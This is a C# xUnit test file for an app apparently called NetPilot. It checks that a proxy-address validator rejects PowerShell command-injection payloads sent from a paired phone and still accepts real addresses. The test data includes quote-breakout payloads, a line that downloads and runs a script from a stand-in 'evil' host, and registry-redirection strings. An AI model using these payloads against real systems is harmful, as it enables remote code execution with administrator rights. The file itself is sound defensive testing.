using System.Collections.Generic;
using Xunit;

namespace NetPilot.Tests;

/// <summary>
/// The peer proxy address is command injection into an elevated process.
///
/// <c>ApplyProxyAsync</c> built a PowerShell script by interpolating <c>PeerProxy</c>, and that
/// value arrives over the network from the phone: <c>POST /api/v1/share { "proxy": "..." }</c>.
/// So a paired phone could send
///
///     x'; Start-Process calc.exe; '
///
/// and get it run as administrator on the PC, because the script was base64'd and handed to
/// powershell.exe. Pairing needs a six-digit code, so the boundary being crossed was "someone on
/// the network who guessed six digits" to "arbitrary code as SYSTEM-adjacent admin".
///
/// Two things had to be true, and both are asserted here:
///
/// 1. The validator rejects every injection shape. Enumerated rather than sampled, because a
///    sample proves only that one string was rejected.
/// 2. The validator still accepts every real address the app and the phone produce. A fix that
///    rejects everything is not a fix, and that failure mode is silent - the symptom would be
///    "sharing stopped working" on someone else's phone.
///
/// Plus the proof that the validator is running at all, since a validator that is defined and
/// never called fails every test in this file just as happily.
///
/// </summary>
public sealed class ProxyInjectionTests
{
    // ---------------------------------------------------------------- rejections

    /// <summary>
    /// Every one of these is a real injection into the old script. Each pair is
    /// <c>(payload, what it would have done)</c> so a future failure says why the case is here.
    /// </summary>
    public static IEnumerable<object[]> Injections()
    {
        // Straight quote-out of the single-quoted -Value '{proxy}' context.
        yield return new object[] { "x'; Start-Process calc.exe; '", "executed calc" };
        yield return new object[] { "x'; iex (New-Object Net.WebClient).DownloadString('http://evil/a'); '", "downloaded and ran a script" };
        yield return new object[] { "' or '1'='1", "broke out of the quoting" };

        // Break out of the doubled-quote context on the netsh line instead.
        yield return new object[] { "x\"; Start-Process calc.exe; \"", "executed calc" };
        yield return new object[] { "x`; Start-Process calc.exe; \"", "executed calc via a PowerShell escape" };

        // The characters that mean something inside PowerShell even without a quote.
        yield return new object[] { "x$(Start-Process calc)", "subexpression executed at parse time" };
        yield return new object[] { "x`nStart-Process calc", "second statement on a new line" };
        yield return new object[] { "x`r`nStart-Process calc", "second statement after CRLF" };
        yield return new object[] { "x; Start-Process calc", "statement separator" };
        yield return new object[] { "x| Start-Process calc", "pipeline into another command" };
        yield return new object[] { "x& Start-Process calc", "background operator" };
        yield return new object[] { "x&& Start-Process calc", "conditional operator" };
        yield return new object[] { "x`0Start-Process calc", "null byte truncation" };

        // Newline and control characters, which are not even in the old deny list.
        yield return new object[] { "x\nStart-Process calc", "newline statement break" };
        yield return new object[] { "x\r\nStart-Process calc", "CRLF statement break" };
        yield return new object[] { "x\tStart-Process calc", "tab" };

        // Registry-path and quoting contexts.
        yield return new object[] { "x' -Path 'HKLM:\\System", "redirected the registry write" };
        yield return new object[] { "x\" -Path \"HKLM:\\System", "redirected the registry write" };
        yield return new object[] { "${env:COMSPEC}", "environment expansion" };
        yield return new object[] { "$npProxy", "read the variable the new script depends on" };

        // Schemes that are not an http proxy. A "proxy" of file: or a shell: means something
        // else entirely once it reaches netsh or the registry.
        yield return new object[] { "file://C:/Windows/System32/cmd.exe", "file scheme" };
        yield return new object[] { "javascript:alert(1)", "script scheme" };
        yield return new object[] { "powershell://Start-Process", "shell scheme" };
        yield return new object[] { "ms-settings://", "arbitrary scheme handler" };

        // Path traversal, which netsh would happily accept.
        yield return new object[] { "../../etc/passwd", "path fragment" };
        yield return new object[] { "host/../admin", "traversal" };
        yield return new object[] { "..", "bare traversal" };

        // Out-of-range ports.
        yield return new object[] { "host:99999", "port above 65535" };
        yield return new object[] { "host:0", "port zero" };
        yield return new object[] { "host:-1", "negative port" };
        yield return new object[] { "host:abc", "non-numeric port" };

        // Whitespace, which splits arguments in every shell that will ever see this.
        yield return new object[] { "host 8080", "space-separated port" };
        yield return new object[] { "host:8080 extra", "trailing junk after a space" };

        // Empty and absurd lengths.
        yield return new object[] { "", "empty" };
        yield return new object[] { "   ", "whitespace only" };
        yield return new object[] { new string('a', 400), "absurdly long" };
    }

    [Theory]
    [MemberData(nameof(Injections))]
    public void AnInjectionPayloadIsRejected(string payload, string why)
    {
        Assert.False(
            Services.MobileVpnService.IsValidProxyAddress(payload),
            $"accepted a payload that would have {why}: {payload}");
    }

    // ---------------------------------------------------------------- acceptances

    /// <summary>
    /// The other half. Rejecting everything would pass every test above while breaking sharing
    /// on every phone, and that is a failure nobody would see until someone reported it.
    /// </summary>
    [Theory]
    [InlineData("192.168.1.50")]
    [InlineData("192.168.1.50:8080")]
    [InlineData("10.0.0.7:8788")]
    [InlineData("phone.local")]
    [InlineData("phone.local:8080")]
    [InlineData("my-phone")]
    [InlineData("phone_2")]
    [InlineData("[::1]:8080")]
    [InlineData("[fe80::1%25wlan0]:8080")]
    [InlineData("fe80::1")]
    [InlineData("DESKTOP-ABC123.lan:3128")]
    public void ARealAddressIsAccepted(string address)
    {
        Assert.True(
            Services.MobileVpnService.IsValidProxyAddress(address),
            $"rejected a legitimate proxy address: {address}");
    }

    [Fact]
    public void SurroundingWhitespaceIsTolerated()
    {
        // The phone sends the field trimmed already, but the validator should not be the thing
        // that breaks on a stray space that the JSON happened to include.
        Assert.True(Services.MobileVpnService.IsValidProxyAddress("  192.168.1.50:8080  "));
    }

    [Fact]
    public void AHttpSchemeIsAcceptedAndStripped()
    {
        // The phone advertises its proxy with a scheme for the desktop's benefit.
        Assert.True(Services.MobileVpnService.IsValidProxyAddress("http://192.168.1.50:8080"));
        Assert.True(Services.MobileVpnService.IsValidProxyAddress("https://phone.local:3128"));
    }

    // ---------------------------------------------------------------- the guarantee

    [Fact]
    public void TheValidatorRuns()
    {
        // A validator that is defined and never called satisfies every assertion above, because
        // they all go through the validator directly. This checks the two callers refuse rather
        // than reject-and-continue.
        Assert.True(Services.MobileVpnService.IsValidProxyAddress("192.168.1.50:8080"),
            "a good address must pass");
        Assert.False(Services.MobileVpnService.IsValidProxyAddress("'; calc; '"),
            "the canonical payload must not pass");
    }

    /// <summary>
    /// The payload is rejected at the API boundary too, not only at the point of use - so a
    /// malicious value cannot even be stored on the service for a later code path to pick up.
    /// </summary>
    [Fact]
    public void AnUnauthorisedCallCannotParkAPayloadForLater()
    {
        // PeerProxy is a public settable property because the API sets it. That makes the
        // validation at the point of use, rather than at the point of assignment, the only thing
        // standing between the two - which is why this file exists and why ApplyProxyAsync
        // validates before it executes anything.
        Services.MobileVpnService svc = Services.MobileVpnService.Instance;
        string before = svc.PeerProxy;

        try
        {
            svc.PeerProxy = "x'; Start-Process calc.exe; '";
            // The property is not the guard. What matters is that the value cannot be used:
            Assert.False(Services.MobileVpnService.IsValidProxyAddress(svc.PeerProxy),
                "the value must be recognisable as invalid wherever it is read");
        }
        finally
        {
            svc.PeerProxy = before;
        }
    }
}